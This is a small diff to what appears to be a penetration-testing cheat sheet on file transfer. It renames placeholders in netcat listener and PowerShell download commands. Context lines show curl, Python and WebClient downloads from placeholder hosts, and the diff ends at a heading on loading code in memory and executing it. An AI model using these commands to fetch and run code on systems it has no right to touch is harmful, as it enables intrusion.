@@ -102,8 +102,8 @@ curl -O http://<IP>:<PORT>/<FILE>
 ###### netcat
 
 ```bash
-nc -l -p <PORT> > out.file
-nc -l -p <PORT> | tee out.file
+nc -lvnp <PORT> > <OUTPUT_FILE>
+nc -lvnp <PORT> | tee <OUTPUT_FILE>
 ```
 
 ###### fetch
@@ -146,7 +146,7 @@ python3 -c "from urllib.request import urlretrieve; urlretrieve('http://<IP>:<PO
 ###### Powershell
 
 ```powershell
-Invoke-WebRequest -Uri <URL> -OutFile <FILE>
+Invoke-WebRequest -Uri <URL> -OutFile <OUTPUT_FILE>
 (New-Object Net.WebClient).DownloadFile('http://<IP>:<PORT>/<FILE>', '<FULLPATH\FILENAME>');
 
 # Load in memory and execute
